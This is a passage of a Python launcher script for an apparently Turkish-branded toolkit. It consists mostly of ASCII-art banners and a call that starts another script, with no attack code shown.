#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from pyfiglet import Figlet
from colorama import Fore, init
import threading
import requests
import time
import sys
import os
import base64
import time as t
import argparse
import sys
import platform
import getpass

# intconsole komutu
    # ASCII sanatı
ascii_sanat = """⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣤⠶⠶⠶⠶⢦⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⡾⠛⠁⠀⠀⠀⠀⠀⠀⠈⠙⢷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣼⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡾⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡾⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣷⠀⠀⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀⠀⠀⣀⣀⣀⣀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠸⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⠀⠀⠀⠀⣠⡴⠞⠛⠉⠉⣩⣍⠉⠉⠛⠳⢦⣄⠀⠀⠀⠀⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡀⠀⣴⡿⣧⣀⠀⢀⣠⡴⠋⠙⢷⣄⡀⠀⣀⣼⢿⣦⠀⠀⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣧⡾⠋⣷⠈⠉⠉⠉⠉⠀⠀⠀⠀⠉⠉⠋⠉⠁⣼⠙⢷⣼⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣇⠀⢻⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡟⠀⣸⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣹⣆⠀⢻⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⡟⠀⣰⣏⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣴⠞⠋⠁⠙⢷⣄⠙⢷⣀⠀⠀⠀⠀⠀⠀⢀⡴⠋⢀⡾⠋⠈⠙⠻⢦⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⡾⠋⠀⠀⠀⠀⠀⠀⠹⢦⡀⠙⠳⠶⢤⡤⠶⠞⠋⢀⡴⠟⠀⠀⠀⠀⠀⠀⠙⠻⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣼⠋⠀⠀⢀⣤⣤⣤⣤⣤⣤⣤⣿⣦⣤⣤⣤⣤⣤⣤⣴⣿⣤⣤⣤⣤⣤⣤⣤⡀⠀⠀⠙⣧⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⣸⠏⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀⠀⠀⢠⣴⠞⠛⠛⠻⢦⡄⠀⠀⠀⠀⠀⠀⠀⢸⡇⠀⠀⠀⠸⣇⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢠⡟⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀⠀⠀⣿⣿⢶⣄⣠⡶⣦⣿⠀⠀⠀⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⢻⡄⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣾⠁⠀⠀⠀⠀⠘⣇⠀⠀⠀⠀⠀⠀⠀⢻⣿⠶⠟⠻⠶⢿⡿⠀⠀⠀⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⠈⣿⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢰⡏⠀⠀⠀⠀⠀⠀⣿⠀⠀⠀⠀⠀⠀⢾⣄⣹⣦⣀⣀⣴⢟⣠⡶⠀⠀⠀⠀⠀⠀⣼⠀⠀⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀⠀⣿⠀⠀⠀⠀⠀⠀⠀⠈⠛⠿⣭⣭⡿⠛⠁⠀⠀⠀⠀⠀⠀⠀⣿⠀⠀⠀⠀⠀⠀⠘⣧⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀⠀⢿⡀⠀⠀⠀⠀⠀⠀⣀⡴⠞⠋⠙⠳⢦⣀⠀⠀⠀⠀⠀⠀⠀⣿⠀⠀⠀⠀⠀⠀⢰⡏⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠈⢿⣄⣀⠀⠀⢀⣤⣼⣧⣤⣤⣤⣤⣤⣿⣭⣤⣤⣤⣤⣤⣤⣭⣿⣤⣤⣤⣤⣤⣼⣿⣤⣄⠀⠀⣀⣠⡾⠁⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠈⠉⠛⠛⠻⢧⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠼⠟⠛⠛⠉⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
. ⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿ ⣿⣿⣿⣿⣿⣷⣷⣶⣿⣿ """	
print(ascii_sanat)
    # 5 saniye boyunca animasyonu çalıştır
os.system("python3 startoolkit.py")

     

time.sleep(0.1)   
      

def exit():
	print("BYE BYE")
	os.system("exit")
	


            
                        
                                    
os.system("clear")


def banner():
	import random
	banners = [
    Fore.RED + """
    ⠀⠀⠀⠀⠀⠀⠀⣀⣤⣴⠶⠾⠿⠛⠛⠻⠿⠶⣶⣤⣀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢠⣾⠟⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣷⣄⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢠⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⣆⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣿⠇⡤⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⡈⣿⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣿⡆⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⠁⣿⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠸⣧⢸⡆⢀⣀⣀⣤⡀⠀⠀⢀⣤⣀⣀⡀⠀⡟⣸⡟⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠹⣿⠁⣿⣿⣿⣿⡟⠀⠀⠸⣿⣿⣿⣿⠆⣿⠟⠀⠀⠀⣀⠀
⠀⢰⡟⢿⣆⠀⠀⣿⠀⠙⢿⣿⠟⠀⣠⣄⠀⠹⣿⣿⠟⠀⢹⠀⠀⣠⡿⢻⠀
⣠⡾⠃⠈⠻⢷⣦⣽⣄⡀⠀⠀⠀⢸⣿⣿⣧⠀⠀⠀⢀⣠⣿⣤⡶⠟⠁⠘⢿⣆
⠻⠷⠶⠶⣶⣤⣈⠙⠻⣿⣷⣦⠀⠸⠋⠙⠟⠀⣠⣾⣿⠟⠋⣁⣠⣴⠶⠶⠟
⠀⠀⠀⠀⠀⠉⠛⠿⣶⣼⠿⣿⣲⡤⡤⡤⢤⢰⣿⡏⣿⣶⠿⠛⠉⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢀⣠⣴⣿⡄⠻⣹⡟⡟⡟⣻⣻⠽⠁⣿⣦⣄⡀⠀⠀⠀⠀⠀
⠀⠀⣶⠾⠶⠾⠟⠋⣁⣼⣷⡀⠀⠉⠉⠉⠉⠀⢀⣼⣧⣀⠉⠛⠷⠶⠿⣶⠀
⠀⠀⠙⣷⡄⢀⣴⠿⠛⠁⠀⠙⠳⠶⠤⠴⠶⠞⠋⠀⠈⠙⠻⣶⡄⠀⣾⠟⠀
⠀⠀⠀⢸⣷⡿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⣶⡿⠀⠀⠀
-----------------------------------------------------------

___ _   _ _____ ___ _  __    _    __  __ ____  _ _ ____
|_ _| \ | |_   _|_ _| |/ /   / \  |  \/  |___ \/ ( ) ___|
 | ||  \| | | |  | || ' /   / _ \ | |\/| | __) | |/\___ \
 | || |\  | | |  | || . \  / ___ \| |  | |/ __/| |  ___) |
|___|_| \_| |_| |___|_|\_\/_/   \_\_|  |_|_____|_| |____/

 ____  _____ ____  _  _______ ___  ____
|  _ \| ____/ ___|| |/ /_   _/ _ \|  _ \
| | | |  _| \___ \| ' /  | || | | | |_) |
| |_| | |___ ___) | . \  | || |_| |  __/
|____/|_____|____/|_|\_\ |_| \___/|_|(("""+Fore.RESET,
    Fore.BLUE + """   
    ___ _   _ _____ ___ _  __    _    __  __ ____  _ _ ____
|_ _| \ | |_   _|_ _| |/ /   / \  |  \/  |___ \/ ( ) ___|
 | ||  \| | | |  | || ' /   / _ \ | |\/| | __) | |/\___ \
 | || |\  | | |  | || . \  / ___ \| |  | |/ __/| |  ___) |
|___|_| \_| |_| |___|_|\_\/_/   \_\_|  |_|_____|""" + Fore.RESET,
    Fore.RED + """           
#                                         >|uJOmwmwmmmLujf>                                       
#                                  .I}La#MW8%BB%BB%BBB%B8WM#aL0?l                                 
#                               ']OhM8%BB%B%p/0B&{_YB%BB%B%BB%8MadU{                              
#                            '+0#WBBBB%B&^'rI (&%a]'MBt jB%B%BB%B%W#mQ-                           
#                           tkW%B%BU"'{%Bn';'f^q&^'<WL,,wB%B%p~>+kBB8WhLr.                        
#                        .1kMB%MQ%Bo.| `c%]L%BB%%%%%%BB#o%BBb._8q*BLM%BMkq1                       
#                       +bM%B*ai,O%&|^B*%%MMk0Zbo**obZ0kMM%%Bu'[WBJ^zYoB%MkO}                     
#                     'ta8B%%|'',I`|%%8apO#***#*#*#*#*#**#Oda8%BBZ:`~vW%BB&apr                    
#                     YM8 >fBBo~^CB%#wb*#**#*#***#*****#*****bw#%&k&B%w~Iw%%#Zp"                  
#                   ^0M%%Bb?.,z8B%*da*#**#****#*#**#*#**#*#*#**ad*%Bc ;'r'oB%#p0I                 
#                  `z*%Bv?MB%Zm%Wpb*ZpM[/#MWMMMMWWMWMWWMMWMQ~kad*bpW%c,'~q8BB%*bq                 
#                  ]o%BL" '{w%%#po*m)}>)*M&MM&#&WM&#WWMWWM&Wn!1 ppop#%BBMpX!XB%ahw                
#                  p&B%W*%aCLBWQ*#f,0t-Jh#MM##*##MM*#MMMMMWMq{1|,!*#QW%p ,.cIa%&p*)               
#                 j#**z/YQOh#*Zoo(Xiii&MWW#WMow)rdkMk#&MMWMW&W|!<J`OaZ#*nr0***#**JJ'              
#                 q*#*b(` ;O*kb*ru:,_k*M*bwpddZ/i}m#b*W#MMMWWW*f'^(}#bk#bu}_~<**#po]              
#                !***p".'>va#hkoY:~'n#WWMhpO*#oM*k1]?(L0h#&WW&Mhi`:!*kh*af_`[,d#**b{              
#                >**#*#**hh****b`_~IaMMWM#W##M*hh)b*hbo*j)&MW&WM!+Xi;****1`Q(c**#*q{              
#                >*OIv    {*#**tCtv!*#WM#M###*#aqxk#M#Mok#pWWM&M[f{zx***#*****#***p{              
#                ~**aahhao***hk*j`:[h#8WWW#W###**dJXL0w#MWWWWW&M]/.lZkh**#*#*#**#*b}              
#                'p***#*#**#*hb#;I`iqMMWMMM##M#MM#*boMMMdd0MW&Wa1"_'/bk#***#**#**p#{              
#                 U*#****#**#*Zon__,)MWWWM&WMW#&WW&MMWMMWMoMk8Wz'Q/~oZ#*#*#**#**#Jd~              
#                 iphdddddZQddaQ*O{?f)aWWMWWMMMWWWMMMWWWWWWW&&U z1XoQaddQZdddddhp*U               
#                  CobdddnI.vdd*ddnI>{.#WWW&W#WMMWMWWW8WW&WW&:~r;[qd*ddZf^)dddbah*;               
#                  >q*dq+~JC)|pdhpk_lI~M&&&&WWMWMWW&W&&&&&&88Q<;<mpadpu>?+><md*ka(                
#                   1moddr: ^{-qdbodh#Mo*MMM#MMMMMM#MMMMMMWMpMMadobddn.Qq|vddoqaj                 
#                    |Zobpt_XJ{.jqdbomk***#**#*****#***#*****kZ*bdpu:c)!!(qboZ*c'                 
#                     ~qakdO.^I')nnddbkadO*#***#*#**#*#**#Obakbddrfi,_ `Zdkapov                   
#                      IUkaddY,z1..OvJdddboohZObo*#obOOaoodd/;v~t?:L}:Jdbakwk!                    
#                        ?qkodpJ>[;`,YdU]CddddddbbbbddddddL--j.|x  ]pqdokq*Z"                     
#                         'xLhhbdq[>qp|`" C":O+ujxcOdt';`<.~^Ur'udddbahL*q^                       
#                            |bw*hdddJ_vllvl``;/ )? OC""?Z?"1~Xpddh*wkoql                         
#                              !OwkaabdddwYUwi/v^^;]dd_?qdddddkaakqop/                            
#                                .iuhdLhooabddddddddddddbaoohLdh*p_^                              
#                                     ^X0kd0ZkoaahhaaokmQd*aZQ}                                   
#                                          .I~~~~~~~~~~~!^     """ + Fore.RESET,
    Fore.RED + """   ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀ ⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣤⣶⡎⠉⠀ ⠙⢧⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠿⠉⠀⠀⠀⠀ ⠀⠈⢳⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡼⠁⠀⠀⠀⠀⠀⠀⠀ ⠀⠀⠀⢻⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡤⣿⠛⠶⠤⠀⠀⠀⠀⠀ ⠀⠀⠀⠈⣷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⣥⣈⠉⠒⠦⣄⠀⣀⠀⠀ ⠀⠀⠀⠀⠸⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⠛⠓⠲⣄⠈⠳⡌⠳⡀ ⠀⠀⠀⢸⣷⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⣿⣿⡇⠀⠀⠈⠳⡀⠈⢦⡹ ⡀⠀⠀⢸⠃⢧⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⠟⢳⣤⠀⢻⡿⣆⠀⢳ ⡗⠀⠀⡼⠀⢸⡆⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣿⣷⣤⡟⠀⠀⠈⠛⣆⠀ ⢷⠀⠀⡇⠀⠨⢧⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⣿⣿⣿⣧⣠⠀⠀⠀⠘⣆ ⠈⠃⣰⠁⠀⠄⠸⣦⡀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⣿⣿⣷⡄⠀⠀⠀⠸ ⡅⢀⡏⠀⠀⠀⢠⠏⠱⣄⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⣿⣿⣿⣷⣤⣠⠖⢻ ⠁⡼⠀⠀⢀⡴⠋⠀⠀⠈⢦⡀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⡟⠉⢻⡻⣿⣿⣿⢧⣠⢏ ⣾⣡⠤⠚⣏⠀⠀⠀⠀⠀⠀⠉⠣⡄⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡞⡿⠁⢠⢿⣿⢿⣿⡿⠋⣿⡏ ⠉⠀⠀⠀⣹⡞⠁⠀⠀⠀⠀⠀⠀⢸⡀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡇⣆⡴⡟⢸⢸⢰⡄⠀⠀⣹⢱ ⠀⠀⠀⢰⢿⡄⠀⠀⠀⠀⠀⠀⠀⠀⢧
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣽⠃⣿⠀⠃⢸⢸⠘⡇⠀⠀⣿⢸ ⠀⠀⠀⠃⠀⢧⡄⢀⡴⠃⠀⠀⠀⠀⠘
⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⢿⡧⣿⠀⠀⡸⣾⠀⡇⠀⠀⣯⡏ ⠀⠀⠀⠀⠀⣸⡷⣫⣴⠀⠀⠀⢀⠂⢀
⠘⣿⣦⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⣇⠀⠀⣿⠀⠀⡇⣿⠰⠇⠀⣸⢻⠇ ⠀⠀⠀⠀⢰⠿⠞⣫⢞⡠⠀⢀⠂⠀⢸
⠀⠘⣿⣿⣿⣦⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡾⣏⠻⣦⣤⣿⠀⠀⢧⡇⠀⠀⠀⢹⣾⠀ ⠀⠀⠀⢠⡏⣠⣼⣋⣉⣀⣴⣁⣀⣀⡎
⠀⠀⠈⢿⣿⣿⣿⣿⣦⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣷⡌⠙⠺⢭⡿⠀⠀⠸⠆⠀⠀⠀⢸⣿⡀ ⠀⠀⠀⡟⢀⡧⣄⣠⣠⣤⣤⣤⣀⣈⡇
⠀⠀⠀⠈⢿⣿⣿⣿⣿⣿⣷⣦⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠿⠃⠀⠈⠢⠐⢤⣧⠀⠀⠀⠀⠀⠀⠀⢸⡿⠀ ⠀⠀⣼⠁⡼⠉⠛⠒⠒⠒⠒⠶⠶⢿⠁
⠀⠀⠀⠀⠀⢿⣿⣿⣿⣿⣿⣿⣿⣷⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⢀⣤⣛⡛⠛⢢⠀⠀⢠⠈⢪⣻⡇⠀⠀⠀⠀⠀⠀⠐⠃⠀ ⠀⢰⠏⢸⡧⠤⠤⠤⢤⣀⣀⡀⠀⡾⠀
⠀⠀⠀⠀⠀⠀⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄⠀⣀⣀⠤⠴⠒⠚⣩⠽⣿⠖⠋⠉⠀⠀⣦⠈⣧⠀⠈⣳⣼⡿⠛⠀⠀⠀⠀⠀⠀⠀⢀⡤ ⠴⠞⠀⣿⠓⠢⠤⠤⠤⠤⣌⣉⣻⡇⠀
⠀⠀⠀⠀⠀⠀⠀⠹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣭⣭⣶⣦⣤⣶⠋⢡⣴⠇⢀⣴⡦⠀⣠⢿⣤⣿⡴⠒⢹⣏⣀⠀⠀⢀⣀⣀⠀⠀⢀ ⣠⣄ ⢀⣤⣾⡯⡀⠀⠉⠒⠒⠤⢤⣭⣽⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠙⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠁⢠⣻⠃⡴⠛⢁⣴⡯⠇⠀⠀⠈⠉⠉⠉⢹⡍⠉⠉⠙⣷⠈⢻⠉ ⠻⠀⠘ ⣟⠻⠀⡉⠁⠀⠀⠀⠀⠀⠀⣠⣿⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⣿⣿⣿⣿⣿⣿⣿⣾⣿⣮⣵⢰⣧⣞⣶⡿⢋⣡⠔⠚⣀⡀⠀⠀⠀⠀⢨⠇⠀⠀⠀⢹⠀⠈⠁⠀⠀⠀ ⠿⠀⠀⠈⠓⠶⠄⠀⠐⣲⡾⠋⡿⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⣿⣿⣿⣿⣿⣿⣿⣾⡿⢿⣿⢎⢠⠟⡠⣾⠟⢋⡠⠤⠤⢤⠤⠾⠤⠤⣤⢤⡼⠀⠀⠀⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⣀⡴⠞⠁⢀⣴⠇⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠛⢿⣿⣿⣿⣿⡙⠻⣿⣿⣿⣿⣝⡋⣮⣴⣞⣥⡄⠀⠀⢀⣀⡤⠴⠚⠛⠪⣟⡧⢤⣄⣠⣄⡐ ⠦⣤⣤⣤⠴⠚⠉⠀⠀⠀⣾⠁⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠻⣿⣿⣿⡄⠈⠙⢿⣿⣿⣿⣿⠟⠋⣁⣤⠴⠚⠉⠁⠀⠀⠀⠀⠀⠀⠉⠲⢤⡀⠉⠉ ⠉⠉⠁⠀⠀⠀⠀⠀⠀⢀⣿⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⢿⣿⡄⠀⠀⢙⣹⣷⠶⠟⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠑⠦ ⣄⠀⠀⠀⠀⠀⠀⠀⠰⢚⡇⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠿⡾⠿⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⠀⠙⠂⠀⠀⠀⠀⠀⠈⠛⠃⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⢀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀""" + Fore.RESET,
    Fore.RED + """
    ⠀ ⠀ ⠀ ⠀ ⠀ ⠀ ⠀ ⠀ ⠀ ⠀ ⠀ ⠀ ⠀ ⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⠤⠤⠀⣀⣀⣀⣀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⠀⠀⠀⠀⠀⠀
⠀ ⠀ ⠀ ⠀ ⠀ ⠀ ⠀ ⠀ ⠀ ⠀ ⠀ ⠀ ⠀ ⠀ ⠀ ⠀⣀⣀⡠⠤⠔⠒⠂⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠉⠉⠁⠀⠒⠒⠠ ⠤⠤⣀⣀⠀⠀⠀
